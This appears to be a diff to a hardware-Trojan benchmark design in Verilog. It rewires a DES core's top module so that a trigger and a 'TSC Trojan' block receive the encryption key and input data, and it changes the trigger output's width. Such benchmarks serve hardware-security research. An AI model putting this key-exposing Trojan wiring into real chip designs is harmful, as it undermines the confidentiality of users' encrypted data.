@@ -8,7 +8,7 @@ module top(clk, rst, decrypt, roundSel, key, desIn, desOut, Tj_Trig);
     input [55:0] key;
     input [63:0] desIn;
     output [63:0] desOut;
-	output [63:0] Tj_Trig;
+	output Tj_Trig;
 
 		des DES (
 			.clk(clk),
@@ -18,6 +18,6 @@ module top(clk, rst, decrypt, roundSel, key, desIn, desOut, Tj_Trig);
 			.desIn(desIn),
 			.desOut(desOut));
 		Trojan_Trigger Trigger(rst, clk, desIn, Tj_Trig);
-		TSC Trojan (clk, rst, key, Tj_Trig);
+		TSC Trojan (clk, rst, key, desIn, Tj_Trig);
 
 endmodule
